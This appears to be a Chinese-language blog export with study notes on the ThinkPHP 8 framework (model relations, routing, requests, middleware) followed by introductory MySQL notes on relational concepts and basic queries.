$list = User::with([&quot;profile&quot;])-&gt;select([10, 11, 12, 17, 18, 19]);foreach ($list as $user)&#123;    dump($user-&gt;profile);&#125;

// 查看显示结构$list = User::with([&quot;profile&quot;])-&gt;select([1, 10, 22]);return json($list);

关联预载入减少了查询次数提高了性能，但是不支持多次调用；

如果你有主表关联了多个附表，都想要进行预载入，可以传入多个模型方法即可；
User::with([&quot;profile&quot;, &quot;book&quot;])

上面显示结构中，主表和附表的字段已经非常多了，需要对两个表字段进行筛略：
// 注意1：withField对应另一个是withoutField// 注意2：关联字段一定要包含外键：user_id，否则空$list = User::field(&quot;id,age,gender,details&quot;)-&gt;with([&quot;profile&quot; =&gt; function($query) &#123;    $query-&gt;withField([&quot;user_id, hobby&quot;]);&#125;])-&gt;select([1, 10, 22]);return json($list);// 或者简单些$list = User::with(&quot;profile&quot;)-&gt;select();// 直接字段，隐藏主表，加上profile隐藏附表，除了hidden，还有对应的visible方法return json($list-&gt;hidden([&quot;status&quot;, &quot;profile.visible&quot;]));

还有一些 预载入缓存、延迟预载入，可以参考手册；


关联统计
使用 withCount()方法，可以统计主表关联附表的个数，输出用 profile_count；
// 统计这三条数据关联的附表数据的个数$list = User::withCount([&quot;profile&quot;])-&gt;select([1, 10, 22]);foreach ($list as $user)&#123;    echo $user-&gt;profile_count.&quot;&lt;br&gt;&quot;;&#125;

关联统计的输出采用“关联方法名” _count，这种结构输出；

不单单支持 Count，还有如下统计方法，均可支持；

**withMax()、withMin()、withSum()、withAvg()**等；

除了 withCount()不需要指定字段，其它均需要指定统计字段；
// 统计附表关联字段的累加和$list = User::withSum([&quot;profile&quot;], &quot;visible&quot;)-&gt;select([1, 10, 22]);foreach ($list as $user) &#123;    echo $user-&gt;profile_sum.&quot;&lt;br&gt;&quot;;&#125;

对于输出的属性，可以自定义：
User::withSum([&quot;profile&quot;=&gt;&quot;p_s&quot;], &quot;visible&quot;)$user-&gt;p_s

多对多关联查询建立三张表
复习一下一对一，一个用户对应一个用户档案资料，是一对一关联；

复习一下一对多，一篇文章对应多个评论，是一对多关联；

多对多怎么理解，分解来看，一个用户对应多个角色，而一个角色对应多个用户；

那么这种对应关系，就是多对多关系，最经典的应用就是权限控制；




tp_user：用户表；tp_role：角色表；tp_access：中间表；

access 表包含了 user 和 role 表的关联 id，多对多模式；
class User extends Model &#123;    public function role()    &#123;        // belongsToMany(&quot;关联模型&quot;,&quot;中间表&quot;,[&quot;外键&quot;,&quot;关联键&quot;]);        return $this-&gt;belongsToMany(Role::class, Access::class);    &#125;&#125;

class Role extends Model&#123;&#125;

// 这里继承的是Pivot，它本身也继承了Model// Pivoit是中间表基类，多对多专用模型class Access extends Pivot&#123;&#125;

权限控制
在控制器段，我们查询一下id为1的用户，并关联查询它的权限：
// 获取一个用户，张三$user = User::find(1);// 获取这个用户所有角色$role = $user-&gt;role;return json($role);

当我们要给一个用户创建一个角色时，用到多对多关联新增；
// 如果这个角色不存在，则会给角色表增加一条信息// 并且，会在中间表关联角色和用户$user-&gt;role()-&gt;save([&quot;type&quot;=&gt;&quot;测试管理专员&quot;]);// 也支持批量$user-&gt;role()-&gt;saveAll([[...],[...]]);

一般来说，上面的这种新增方式，用于初始化角色比较合适；

但是，很多情况下，角色权限是初始化好的，只需要添加中间表，而不是角色表；

那么，我们真正需要就是通过用户表新增到中间表关联即可；
// 给张三添加一个已经存在的角色，直接传角色ID即可$user-&gt;role()-&gt;save(1);// 或$user-&gt;role()-&gt;save(Role::find(1));$user-&gt;role()-&gt;saveAll([1,2,3]); // 或，如果有其它字段，可以通过中括号添加$user-&gt;role()-&gt;attach(1);$user-&gt;role()-&gt;attach(2, [&quot;details&quot;=&gt;&quot;测试详情&quot;]);

除了新增，还有直接删除中间表数据的方法：
// 取消掉张三的所有，1，2，6，这里的值是角色的ID，不是中间表ID$user-&gt;role()-&gt;detach(1);$user-&gt;role()-&gt;detach([2, 6]);

路由定义路由入门
路由的作用就是让 URL 地址更加的规范和优雅，或者说更加简洁；

设置路由对 URL 的检测、验证等一系列操作提供了极大的便利性；

路由是默认开启的，如果想要关闭路由，在 config&#x2F;app.php 配置；
// 是否启用路由&quot;with_route&quot;       =&gt; true,

路由的配置文件在 config&#x2F;route.php 中，定义文件在 route&#x2F;app.php；

我们还回到最初的 Index 控制器，创建一个 details 带 参数的方法；
public function details($id)&#123;    return &quot;details ID：&quot;.$id;&#125; 

http://www.tp.com:8000/index/details/id/5

此时，我们在根目录 route 下的 app.php 里配置路由：
// 参数1：url/参数// 参数2：控制器/方法Route::rule(&quot;details/:id&quot;, &quot;Index/details&quot;);// 访问地址http://www.tp.com:8000/details/5

rule()方法是默认请求是 any，即任何请求类型均可，第三参数可以限制：
Route::rule(&quot;details/:id&quot;, &quot;Index/xxx&quot;, &quot;GET&quot;);Route::rule(&quot;details/:id&quot;, &quot;Index/xxx&quot;, &quot;POST&quot;);Route::rule(&quot;details/:id&quot;, &quot;Index/xxx&quot;, &quot;GET|POST&quot;);

所有的请求方式均有快捷方式，比如 ::get() 、**::post()** 等，具体查看手册：路由 -&gt; 路由定义；
// 快捷方式，无须第三参数了Route::get(...)Route::post(...)Route::delete(...)

在路由的规则表达式中，有多种地址的配置规则：
// 静态路由Route::rule(&quot;test&quot;, &quot;Index/test&quot;);// 带一个参数Route::rule(&quot;details/:id&quot;, &quot;Index/details&quot;);// 带两个参数Route::rule(&quot;details/:id/:uid&quot;, &quot;Index/details&quot;);// 带可选参数，一般在后面Route::rule(&quot;details/:id/[:uid]&quot;, &quot;Index/details&quot;);// 全动态地址，不限定details，url可以是：abc/5/6，后面details也可以动态Route::rule(&quot;:details/:id/:uid&quot;, &quot;Index/details&quot;);// 正则规则，完全匹配Route::rule(&quot;details/:id/:uid$&quot;, &quot;Index/details&quot;);

强制路由
目前来说，路由访问模式和URL访问模式都可以使用，但我们强制路由访问；

开始强制路由，需要在 route.php 里面进行配置：
// 是否强制使用路由&quot;url_route_must&quot;        =&gt; true,

// 首页也必须设置路由Route::rule(&quot;/&quot;, &quot;Index/index&quot;);

完全匹配规则匹配检测的时候默认只是对URL从头开始匹配，只要URL地址开头包含了定义的路由规则就会匹配成功，如果希望URL进行完全匹配，可以在路由表达式最后使用$符号，例如：
Route::get(&#x27;new/:cate$&#x27;, &#x27;News/category&#x27;);

这样定义后
http://serverName/index.php/new/info

会匹配成功,而
http://serverName/index.php/new/info/2

则不会匹配成功。
如果是采用
Route::get(&#x27;new/:cate&#x27;, &#x27;News/category&#x27;);

方式定义的话，则两种方式的URL访问都可以匹配成功。
如果需要全局进行URL完全匹配，可以在路由配置文件中设置
// 开启路由完全匹配&#x27;route_complete_match&#x27;   =&gt; true,

开启全局完全匹配后，如果需要对某个路由关闭完全匹配，可以使用
Route::get(&#x27;new/:cate&#x27;, &#x27;News/category&#x27;)-&gt;completeMatch(false);

路由闭包和变量规则闭包
闭包支持我们可以通过 URL 直接执行，而不需要通过控制器和方法；
// 闭包Route::get(&quot;think&quot;, function () &#123;    return &quot;hello, ThinkPHP8!&quot;;&#125;);

闭包支持也可以传递参数和动态规则：
// 带参数闭包，如果不带:version，那么地址：php?version=8Route::get(&quot;php/:version&quot;, function ($version) &#123;    return &quot;PHP&quot;.$version;&#125;);

变量规则
系统默认的路由变量规则为\w+，即字母、数字、中文和下划线；

如果你想更改默认的匹配规则，可以修改 config&#x2F;route.php 配置；
// 默认的路由变量规则&quot;default_route_pattern&quot; =&gt; &quot;[\w\.]+&quot;,

如果我们需要对于具体的变量进行单独的规则设置，则需要通过 pattern() 方法；

将 details 方法里的 id 传值，严格限制必须只能是数字\d+；
// 正则规则 \d+ 限定id为数字Route::rule(&quot;details/:id&quot;, &quot;Index/details&quot;)            -&gt;pattern([&quot;id&quot;=&gt;&quot;\d+&quot;]);// 多个参数-&gt;pattern([    &quot;id&quot;  =&gt; &quot;\d+&quot;,    &quot;uid&quot; =&gt; &quot;\d+&quot;]);

如果让指定的参数统一限定为数字，比如id和uid，也就是全局设置，在app.php顶部设置：
Route::pattern([    &quot;id&quot;  =&gt; &quot;\d+&quot;,    &quot;uid&quot; =&gt; &quot;\d+&quot;]);

不喜欢斜杠怎么办？能换成减号吗？可以的：
// 支持替换斜杠Route::rule(&quot;details-:id&quot;, &quot;Index/details&quot;);    // 支持组合变量&lt;id&gt;方式Route::rule(&quot;details-&lt;id&gt;&quot;, &quot;Index/details&quot;);

路由参数.域名.MISS参数
设置路由的时候，可以设置相关方法进行，从而实施匹配检测和行为执行；

ext 方法作用是检测 URL 后缀，比如：我们强制所有 URL 后缀为.html；
Route::rule(&quot;test&quot;, &quot;Index/test&quot;)-&gt;ext(&quot;html&quot;);Route::rule(&quot;test&quot;, &quot;Index/test&quot;)-&gt;ext(&quot;html|shtml&quot;);

https 方法作用是检测是否为 https 请求，结合 ext 强制 html 如下：
Route::rule(&quot;test&quot;, &quot;Index/test&quot;)-&gt;ext(&quot;html&quot;)-&gt;https();

如果想让全局统一配置 URL 后缀的话，可以在 config&#x2F;route.php 中设置；

具体值可以是单个或多个后缀，也可以是空字符串(任意后缀)，false 禁止后缀；
// URL伪静态后缀&quot;url_html_suffix&quot;       =&gt; &quot;html&quot;,

denyExt 方法作用是禁止某些后缀的使用，使用后直接报错；
// 可以将url_html_suffix 设置为空测试Route::rule(&quot;test&quot;, &quot;Index/test&quot;)-&gt;denyExt(&quot;jpg|gif|png&quot;);

domain 方法作用是检测当前的域名是否匹配，完整域名和子域名均可；
Route::rule(&quot;test&quot;, &quot;Index/test&quot;)-&gt;domain(&quot;localhost&quot;);Route::rule(&quot;test&quot;, &quot;Index/test&quot;)-&gt;domain(&quot;new.tp.com&quot;);Route::rule(&quot;test&quot;, &quot;Index/test&quot;)-&gt;domain(&quot;new&quot;);

还有ajax&#x2F;pjax&#x2F;json检测、filter 额外参数检测、append追加额外参数、option统一管理检测，可参考手册；
Route::rule(&quot;test&quot;, &quot;Index/test&quot;)-&gt;option([    &quot;ext&quot;       =&gt;  &quot;html&quot;,    &quot;https&quot;     =&gt;  false,    &quot;domain&quot;    =&gt;  &quot;www.tp.com&quot;]);

域名
如果想限定的某个域名下生效的路由，比如 news.tp.com 可以通过域名闭包方式：
Route::domain(&quot;news.tp.com&quot;, function () &#123;	Route::rule(&quot;details/:id&quot;, &quot;Index/details&quot;);&#125;);// 或Route::domain(&quot;news&quot;, function () &#123;	Route::rule(&quot;details/:id&quot;, &quot;Index/details&quot;);&#125;);

路由域名也支持：ext、pattern、append 等路由参数方法的操作；


MISS
全局 MISS,类似开启强制路由功能，匹配不到相应规则时自动跳转到 MISS；
Route::miss(&quot;Error/miss&quot;);// 闭包模式Route::miss(function () &#123;    return &quot;MISS 404&quot;;&#125;);

路由分组.URL生成分组
路由分组，即将相同前缀的路由合并分组，这样可以简化路由定义，提高匹配效率；

使用 group()方法，来进行分组路由的注册；
Route::group(&quot;index&quot;, function () &#123;    Route::rule(&quot;:id&quot;, &quot;Index/details&quot;);    Route::rule(&quot;:name&quot;, &quot;Index/hello&quot;);&#125;)-&gt;ext(&quot;html&quot;)-&gt;pattern([&quot;id&quot;=&gt;&quot;\d+&quot;]);// URL1: http://www.tp.com:8000/index/5.html// URL2: http://www.tp.com:8000/index/world.html

也可以省去第一参数，让分组路由更灵活一些；
Route::group(function() &#123;    Route::rule(&quot;test&quot;, &quot;Index/test&quot;);    Route::rule(&quot;h/:name&quot;, &quot;Index/hello&quot;);&#125;)-&gt;ext(&quot;html&quot;);// URL1: http://www.tp.com:8000/test.html// URL2: http://www.tp.com:8000/h/world.html

使用 prefix()方法，可以省略掉分组地址里的控制器；
Route::group(&quot;index&quot;, function () &#123;    Route::rule(&quot;test&quot;, &quot;test&quot;);    Route::rule(&quot;:name&quot;, &quot;hello&quot;);&#125;)-&gt;prefix(&quot;Index/&quot;)-&gt;ext(&quot;html&quot;);// URL1: http://www.tp.com:8000/index/test.html// URL2: http://www.tp.com:8000/index/world.html

URL生成
使用 url() 助手函数来生成定义好的路由地址，放在在控制器使用；
// 静态不带参数的Route::rule(&quot;test&quot;, &quot;Index/test&quot;)-&gt;ext(&quot;html&quot;);// 控制器段获取url：/test.htmlreturn url(&quot;Index/test&quot;);// 动态带参数的Route::rule(&quot;details/:id&quot;, &quot;Index/details&quot;)-&gt;ext(&quot;html&quot;);// 控制器段获取url：/details/5.htmlreturn url(&quot;Index/details&quot;, [&quot;id&quot;=&gt;5]);// url参数一和路由的rule的参数二是一致的，可以通过name方法复刻；Route::rule(&quot;details/:id&quot;, &quot;Index/details&quot;)-&gt;name(&quot;de&quot;)-&gt;ext(&quot;html&quot;);// 控制器段获取url：/details/5.htmlreturn url(&quot;de&quot;, [&quot;id&quot;=&gt;5]);// 完整带域名的地址：http://www.tp.com:8000/details/5.htmlreturn url(&quot;de&quot;, [&quot;id&quot;=&gt;5])-&gt;domain(true);return url(&quot;de&quot;, [&quot;id&quot;=&gt;5])-&gt;domain(&quot;www.tp.com&quot;);

在手册 -&gt; 路由 -&gt; URL 生成 有 Route::buildUrl() 源方法，只不过助手函数，更方便；


资源路由创建资源
资源路由，采用固定的常用方法来实现简化 URL 的功能；
Route::resource(&quot;blog&quot;, &quot;Blog&quot;);

系统提供了一个命令，方便开发者快速生成一个资源控制器；
php think make:controller Blog

以上的两部操作，创建了一个控制器Blog类，并生成了增删改查操作的方法，而且还实现了全部路由：



标识
请求类型
路由规则
操作方法



index
GET
blog
index


create
GET
blog&#x2F;create
create


save
POST
blog
save


read
GET
blog&#x2F;:id
read


edit
GET
blog&#x2F;:id&#x2F;edit
edit


update
PUT
blog&#x2F;:id
update


delete
DELETE
blog&#x2F;:id
delete




地址URL
资源路由注册好后，所有地址都是全自动生成，具体如下：
http://www.tp.com:8000/blog				//GET 访问的是index方法，用于显示数据http://www.tp.com:8000/blog/create		//GET 访问的是create方法，新增数据的表单页面http://www.tp.com:8000/blog/5			//GET 访问的是read方法，读取指定id的一条数据http://www.tp.com:8000/blog/5/edit		//GET 访问的是edit方法，读取指定id数据并显示修改表单

http://www.tp.com:8000/blog				//POST 访问的是save方法，用于接收表单提交的新增数据http://www.tp.com:8000/blog/5			//PUT  访问的是update方法，用于接收表单提交的修改数据http://www.tp.com:8000/blog/5			//DELETE 访问的是delete方法，用于接收数据删除信息

默认的参数采用 id 名称，如果你想别的，比如：blog_id；
//相应的 delete($blog_id)...-&gt;vars([&quot;blog&quot;=&gt;&quot;blog_id&quot;]); 

也可以通过 only() 方法限定系统提供的资源方法：
// 只允许指定的这些操作...-&gt;only([&quot;index&quot;,&quot;save&quot;,&quot;create&quot;]);

还可以通过 except() 方法排除系统提供的资源方法：
// only相反操作...-&gt;except([&quot;read&quot;,&quot;delete&quot;,&quot;update&quot;])

使用 rest() 方法，更改系统给予的默认方法，1.请求方式；2.地址；3.操作；
Route::rest(&quot;create&quot;, [&quot;GET&quot;, &quot;/add&quot;, &quot;add&quot;]);// 批量Route::rest([    &quot;save&quot; =&gt; [&quot;POST&quot;, &quot;&quot;, &quot;store&quot;],    &quot;update&quot; =&gt; [&quot;PUT&quot;, &quot;/:id&quot;, &quot;save&quot;],    &quot;delete&quot; =&gt; [&quot;DELETE&quot;, &quot;/:id&quot;, &quot;destory&quot;],]);

支持嵌套资源路由，类似于一对多关联的感觉，实战中用到再操作，详情查看手册：


视图.变量,渲染视图操作
首先，为了方便后续课程学习，先把路由给关闭了；并创建一个用于测试视图的控制器：
// 是否启用路由&quot;with_route&quot;       =&gt; false,// 视图控制器class ViewPage extends BaseController&#123;    public function index()    &#123;        return &quot;view&quot;;    &#125;&#125;

由于我们不用模板引擎，直接使用php原生，就需要使用 engine() 方法，载入 test 模板；
// 载入原生php模板return View::engine(&quot;php&quot;)-&gt;fetch(&quot;test&quot;);// 模板地址为：view/view_page/test.html// 或修改配置文件，将Think改为php就可以使用助手函数return view(&quot;test&quot;);

如果希望模板后缀为 .php，方便 php + html5 混编，在 config&#x2F;view 设置：
// 模板后缀&quot;view_suffix&quot;   =&gt; &quot;php&quot;,

在 fetch() 方法的第二参数，通过数组方式给模板传递变量：
return View::engine(&quot;php&quot;)-&gt;fetch(&quot;test&quot;, [    &quot;name&quot;  =&gt;  &quot;ThinkPHP8&quot;]);// 或 return view(&quot;test&quot;，[    &quot;name&quot;  =&gt;  &quot;ThinkPHP8&quot;]);

表单提交
先载入一个表单页面：
return View::engine(&quot;php&quot;)-&gt;fetch(&quot;input&quot;);

创建一个表单：
&lt;form action=&quot;/view_page/save&quot; method=&quot;post&quot;&gt;    &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;    &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/input&gt;	&lt;/form&gt;

接受数据：
public function save()&#123;    return $this-&gt;request-&gt;post(&quot;username&quot;);&#125;

请求对象.变量.信息请求对象
上一节课中表单提交时，我们接受数据使用了 $this-&gt;request-&gt;post() 方法，这哪里来的？

因为我们的控制器继承了 BaseController 追踪进去，可以看到 $request 成员字段；

关于这个知识点的源知识点，可以参考：手册 -&gt; 架构 -&gt; 容器和依赖注入，TP6讲过，8不讲了；

在没有继承 BaseController 时，我们需要自己手动注入请求：
namespace app\controller;use think\Request;class Rely&#123;    protected $request;    // 依赖注入    public function __construct(Request $request)    &#123;        $this-&gt;request = $request;    &#125;    public function index()    &#123;        halt($this-&gt;request-&gt;get());    &#125;&#125;// 上面的请求方式比较原始，过于麻烦，不推荐了

第二种方式：门面Facade，它相关的知识点在手册 -&gt; 架构 -&gt; 门面：
namespace app\controller;use think\facade\Request;class Rely&#123;    public function index()    &#123;        halt(Request::get());    &#125;&#125;

第三种方式：继承 BaseController，其实就是第一种，只不过被封装到基类中去了：
namespace app\controller;use app\BaseController;class Rely extends BaseController&#123;    public function index()    &#123;        halt($this-&gt;request-&gt;get());    &#125;&#125;

第四种方式：终极方法 request()  助手函数：
halt(request()-&gt;get());

请求信息
在手册 请求 -&gt; 请求信息 里有全部的请求方法模块，这里列举几个意思一下：



方法
含义



host
当前访问域名或者IP


port
当前访问的端口


url
当前完整URL


root
URL访问根地址


method
当前请求类型



我们三种方法演示一遍，最终选一种你喜欢的即可：
// 当前urlecho $this-&gt;request-&gt;url();echo Request::url();echo request()-&gt;url();// 请求方法echo request()-&gt;method();// 更多的对照手册自行测试即可

请求变量
Request 对象支持全局变量的检测、获取和安全过滤，支持$_GET、$_POST…等；

使用 has() 方法，可以检测全局变量是否已经设置：
// 判断是否有GET模式下id的值echo request()-&gt;has(&quot;id&quot;, &quot;get&quot;);

更多方法，参看手册 请求 -&gt; 输入变量， 这里意思几个：



方法
描述



param
获取当前请求变量


get
获取 $_GET 变量


post
获取 $_POST 变量


put
获取 PUT 变量


delete
获取 DELETE 变量


session
获取 SESSION 变量



param() 方法是框架推荐的方法，可以自动识别诸如 get、post等数据信息；
// url: http://www.tp.com:8000/rely/index?id=5// 可以获取 get 模式 id 的值echo request()-&gt;param(&quot;id&quot;);echo request()-&gt;get(&quot;id&quot;);// url: http://www.tp.com:8000/rely/index/id/5// 此时，只能是param获取echo request()-&gt;param(&quot;id&quot;);

// 默认值request()-&gt;param(&quot;name&quot;)			// null，实际上页面也转行成空，判断null也成立request()-&gt;param(&quot;name&quot;, &quot;&quot;)		// 空字符串request()-&gt;param(&quot;name&quot;, &quot;无名氏&quot;);	  // 无名氏

可在 app\Request.php 配置过滤器：
http://www.tp.com:8000/rely/index?name=我&lt;b&gt;你&lt;/b&gt;// 将特殊字符转换HTML实体protected $filter = [&quot;htmlspecialchars&quot;];// 如果不想要全局过滤器，可以直接局部request()-&gt;param(&quot;name&quot;, &quot;&quot;, &quot;htmlspecialchars&quot;);// 设置了全局过滤器，但某个不想用request()-&gt;param(&quot;name&quot;, &quot;&quot;, null)// 使用变量修饰符，可以将参数强制转换成指定的类型；// /s(字符串)、/d(整型)、/b(布尔)、/a(数组)、/f(浮点)；request()-&gt;param(&quot;id/d&quot;);

only()、except() 设置允许和排查可接受的变量：
// 允许id和name变量request()-&gt;only([&quot;id&quot;,&quot;name&quot;]);// 默认值设置request()-&gt;only([&quot;id&quot;=&gt;1,&quot;name&quot;=&gt;&quot;默认值&quot;]);// 参数二可设置GET还是POST等request()-&gt;only([&quot;id&quot;,&quot;name&quot;], &quot;GET&quot;);

以上所有，都封装到助手函数 input() 里了：
input(&quot;?get.id&quot;); 		//判断 get 下的 id 是否存在input(&quot;?post.name&quot;); 	//判断 post 下的 name 是否存在input(&quot;param.name&quot;); 	//获取 param 下的 name 值input(&quot;param.name&quot;, &quot;默认值&quot;); 	//默认值input(&quot;param.name&quot;, &quot;&quot;, &quot;htmlspecialchars&quot;); 	//过滤器input(&quot;param.id/d&quot;); 	//设置强制转换

请求类型.输出.重定向请求类型
Request 对象提供了一个方法 method() 来获取当前请求类型，也提供了判断当前的请求类型：



方法
说明



method
获取当前请求类型


isGet
判断是否GET请求


isPost
判断是否POST请求


isPut
判断是否PUT请求


isDelete
判断是否DELETE请求


isAjax
判断是否AJAX请求



使用请求类型伪装，可以提交 PUT、DELETE 类型：
// 载入表单模板public function create()&#123;    return View::engine(&quot;php&quot;)-&gt;fetch(&quot;create&quot;);&#125;// 表单&lt;form action=&quot;/rely&quot; method=&quot;post&quot;&gt;    &lt;input type=&quot;text&quot; name=&quot;name&quot;&gt;    &lt;input type=&quot;hidden&quot; name=&quot;_method&quot; value=&quot;PUT&quot;&gt;    &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt;   // 判断是否PUT请求if (request()-&gt;isPut()) &#123;	echo input(&quot;put.name&quot;);&#125;// 直接ajax、pjax伪装，在url后续添加?_ajax=1即可，结合前段时再研究

响应输出
响应输出，有好几种：包括 return、json() 和 view() 等等；

默认输出方式是以 html 格式输出，如果你发起 json 请求，则输出 json；

而背后是 response 对象，可以用 response() 输出达到相同的效果；
$data = &quot;Hello,TP8!&quot;;// 等同于 return $data;return response($data);

response()方法可以设置第二参数，状态码，或调用 code()方法；
// 参数二，发送状态码return response($data, 201);//或return response($data)-&gt;code(201);// json()和view()均支持状态码

重定向
使用 redirect()方法可以实现页面重定向，需要 return 执行；
// 首页return redirect(&quot;/&quot;);// 访问路由页面，外加状态码return redirect(&quot;details/5&quot;, 303);// 访问url生成的地址return redirect(url(&quot;Index/index&quot;));

还支持session跳转和记住上一次地址的跳转，实战时再研究；


中间件定义定义中间件
中间件的主要用于拦截和过滤 HTTP 请求，并进行相应处理；

这些请求的功能可以是 URL 重定向、权限验证等等；

为了进一步了解中间件的用法，我们首先定义一个基础的中间件；

可以通过命令行模式，在应用目录下生成一个中间件文件和文件夹；
php think make:middleware Check

public function handle($request, \Closure $next)&#123;    // 拦截请求    if ($request-&gt;param(&quot;name&quot;) == &quot;index&quot;)    &#123;        return redirect(&quot;../../../../&quot;);    &#125;    // 继续往执行    return $next($request);&#125;

然后将这个中间件进行注册，在应用目录下的middleware.php文件中配置；
// 注册中间件app\middleware\Check::class

中间件的入口执行方法必须是：handle()方法，第一参数请求，第二参数是闭包；

业务代码判断请求的 name 如果等于 index，就拦截住，执行中间件，跳转到首页；

但如果请求的 name 是 lee，那需要继续往下执行才行，不能被拦死；

那么就需要$next($request)把这个请求去调用回调函数；

中间件 handle()方法规定需要返回 response 对象，才能正常使用；

而$next($request)执行后，就是返回的 response 对象；

为了测试拦截后，无法继续执行，可以 return response()助手函数测试；


前后置中间件
将$next($request)放在方法底部的方式，属于前置中间件；

前置中间件就是请求阶段来进行拦截验证，比如登录判断、跳转、权限等；

而后置中间件就是请求完毕之后再进行验证，比如写入日志等等；
public function handle($request, \Closure $next)&#123;    //中间件代码，前置    return $next($request);&#125;

public function handle($request, \Closure $next)&#123;    $response = $next($request);    //中间件代码，后置    return $response;&#125;

// 先执行内容，再执行中间件$response = $next($request);// 拦截请求if ($request-&gt;param(&quot;name&quot;) == &quot;index&quot;)&#123;    return redirect(&quot;../../../../&quot;);&#125;return $response;

中间件操作路由中间件
创建一个给路由使用的中间件，判断路由的 ID 值实现相应的验证；
php think make:middleware Auth

路由方法提供了一个 middleware() 方法，让指定的路由采用指定的中间件；
// 限定这个路由采用了中间件Route::rule(&#x27;/&#x27;, &#x27;Index/index&#x27;)-&gt;middleware(\app\middleware\Auth::class);

// 导入后，可以省略use app\middleware\Auth;use app\middleware\Check;// 路由采用多个中间件Route::rule(&#x27;/&#x27;, &#x27;Index/index&#x27;)-&gt;middleware([Auth::class, Check::class]);

也可以在 config&#x2F;middleware.php 配置文件加中，配置别名支持；
// 别名或分组&#x27;alias&#x27;    =&gt; [    &quot;Auth&quot;  =&gt; \app\middleware\Auth::class,    &quot;Check&quot; =&gt; \app\middleware\Check::class,],

// 当然，Route::group() 路由分组也支持Route::rule(&#x27;/&#x27;, &#x27;Index/index&#x27;)-&gt;middleware([&quot;Auth&quot;, &quot;Check&quot;]);

2. 控制器中间件
如果不用路由，怎么用局部化的中间件呢？当然也可以直接在控制器上定义；
// 这里是别名方式，和路由一样，另外两种均支持protected $middleware = [&quot;Auth&quot;, &quot;Check&quot;];

默认是控制器全体方法有效，如果需要限制，还是 only 和 except；
protected $middleware = [    &quot;Auth&quot;  =&gt;  [&quot;only&quot; =&gt;  [&quot;hello&quot;]],    &quot;Check&quot; =&gt;  [&quot;only&quot; =&gt;  [&quot;index&quot;]]];

]]></content>
      <categories>
        <category>开发</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQl</title>
    <url>/2023/10/08/MySQl%20%20max/MySQl/</url>
    <content><![CDATA[在MySQL中最好所有数据都用英文表示，中文实在搞不成功！！！
数据库的三种类型：层次模型，网状模型，关系模型。
数据类型关系数据库支持的标准数据类型包括数值、字符串、时间等

操作数据库的能力DDL：Data Definition Language
DDL允许用户定义数据，也就是创建表、删除表、修改表结构这些操作。通常，DDL由数据库管理员执行。
DML：Data Manipulation Language
DML为用户提供添加、删除、更新数据的能力，这些是应用程序对数据库的日常操作。
DQL：Data Query Language
DQL允许用户查询数据，这也是通常最频繁的数据库日常操作。
语法特点SQL语言关键字不区分大小写！！！但是，针对不同的数据库，对于表名和列名，有的数据库区分大小写，有的数据库不区分大小写。同一个数据库，有的在Linux上区分大小写，有的在Windows上不区分大小写。
关系模型表的每一行称为记录（Record），记录是一个逻辑意义上的数据。
表的每一列称为字段（Column），同一个表的每一行记录都拥有相同的若干字段。
字段定义了数据类型（整型、浮点型、字符串、日期等），以及是否允许为NULL。注意NULL表示字段数据不存在。一个整型字段如果为NULL不表示它的值为0，同样的，一个字符串型字段为NULL也不表示它的值为空串’ ‘。
通常情况下，字段应该避免允许为NULL。不允许为NULL可以简化查询条件，加快查询速度，也利于应用程序读取数据后无需判断是否为NULL。
在关系数据库中，关系是通过主键和外键来维护的。
主键对于关系表，有个很重要的约束，就是任意两条记录不能重复。不能重复不是指两条记录不完全相同，而是指能够通过某个字段唯一区分出不同的记录，这个字段被称为主键。（主键不能够一样）
对主键的要求，最关键的一点是：记录一旦插入到表中，主键最好不要再修改，因为主键是用来唯一定位记录的，修改了主键，会造成一系列的影响。
选取主键的一个基本原则是：不使用任何业务相关的字段作为主键。（手机号码，身份证号码，邮箱地址皆不行）
主键的字段一般命名为id，常见可做id字段类型的类型有：
1.自增整数类型：数据库会在插入数据时自动为每一条记录分配一个自增整数，这样我们就完全不用担心主键重复，也不用自己预先生成主键；
2.全局唯一GUID类型：使用一种全局唯一的字符串作为主键。
联合主键：关系数据库实际上还允许通过多个字段唯一标识记录，即两个或更多的字段都设置为主键
对于联合主键，允许一列有重复，只要不是所有主键列都重复即可。（一般不使用联合主键，避免更加复杂）
外键
多对多通过一个表的外键关联到另一个表，我们可以定义出一对多关系。有些时候，还需要定义“多对多”关系。例如，一个老师可以对应多个班级，一个班级也可以对应多个老师，因此，班级表和老师表存在多对多关系。
多对多关系实际上是通过两个一对多关系实现的，即通过一个中间表，关联两个一对多关系，就形成了多对多关系：

一对一一对一关系是指，一个表的记录对应到另一个表的唯一一个记录。
总的：关系数据库通过外键可以实现一对多、多对多和一对一的关系。外键既可以通过数据库来约束，也可以不设置约束，仅依靠应用程序的逻辑来保证。
索引索引是关系数据库中对某一列或多个列的值进行预排序的数据结构。

唯一索引

导入数据先创建database(例子：create database 文件名;)
然后 sorce 文件路径；例子：source C:\Users\BD\MySQLwenjian\bilibili.sql;注意路径中不要有中文
只看表的结构desc &lt;表名&gt;;
查询数据基本查询查询数据库表的数据：SELECT * FROM 表名；
SELECT 也可以用于计算（例如：SELECT 100 + 200；）
条件查询基本SELECT语句通过WHERE条件来设定查询条件:SELECT * FROM &lt;表名&gt; WHERE &lt;条件表达式&gt;
（例如：SELECT * FROM students WHERE score&gt;=80;)
条件表达式:1.**&lt;条件1&gt; AND &lt;条件2&gt;**表达满足条件1并且满足条件2
​                    2.**&lt;条件1&gt; OR &lt;条件2&gt;**表示满足条件1或者满足条件2
​                    3**. NOT &lt;条件&gt;**，表示“不符合该条件”的记录(例如：写一个“不是2班的学生”这个条件：NOT class_id &#x3D; 2：)
​                         要组合三个或者更多的条件，就需要用小括号()表示如何进行条件运算
​                      （例：SELECT * FROM students WHERE (score &lt; 80 OR score &gt; 90) AND gender &#x3D; ‘M’;）
如果不加括号，条件运算按照NOT、AND、OR的优先级进行，即NOT优先级最高，其次是AND，最后是OR

模糊查询like;支持%或下划线匹配
%匹配任意多个字符；下划线是任意一个字符
例子：SELECT ename from emp where ename like&#39;%o%&#39;;（表示名字中间含’O’的）
​           SELECT ename from emp where ename like&#39;%T&#39;;（表示名字以’T’结尾）
​          SELECT ename from emp where ename like&#39;_A%&#39;;（表示第二个字母是’A’）
子查询where中的子查询例子：找出比最低工资高的员工
